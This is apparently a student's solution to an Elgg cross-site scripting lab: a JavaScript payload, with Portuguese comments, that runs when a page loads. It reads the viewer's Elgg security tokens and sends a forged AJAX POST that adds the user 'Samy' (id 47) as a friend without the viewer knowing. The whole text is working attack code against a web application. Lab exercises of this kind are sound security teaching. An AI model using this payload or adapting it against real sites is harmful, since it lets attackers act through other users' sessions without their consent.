<script type="text/javascript">
window.onload = function () {
    var Ajax=null;
    var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
    var token="&__elgg_token="+elgg.security.token.__elgg_token;
    
    // Construir o pedido HTTP para adicionar Samy como amigo
    var sendurl="http://www.xsslabelgg.com/action/friends/add"
                 + "?friend=47" + token + ts;
    
    //Cria e envia pedido Ajax para adicionar amigo
    Ajax=new XMLHttpRequest();
    Ajax.open("POST",sendurl,true);
    Ajax.setRequestHeader("Host","www.xsslabelgg.com");
    Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
    Ajax.send();
}
</script>